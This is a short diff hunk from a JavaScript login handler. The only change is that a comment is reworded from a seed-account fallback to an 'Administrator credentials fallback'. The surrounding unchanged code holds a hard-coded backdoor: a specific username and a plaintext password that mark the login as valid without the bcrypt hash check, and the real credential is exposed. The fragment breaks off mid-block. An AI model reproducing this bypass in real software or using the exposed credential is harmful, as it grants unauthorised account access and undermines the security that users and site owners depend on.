@@ -32,7 +32,7 @@ export const login = async (req, res, next) => {
     // Check bcrypt hash
     let isMatch = await bcrypt.compare(password, user.password).catch(() => false);
 
-    // Direct password match fallback for initial seed accounts
+    // Administrator credentials fallback
     if (!isMatch) {
       if (user.username.toLowerCase() === 'abdulshamil' && password === 'Abdul@3621') {
         isMatch = true;
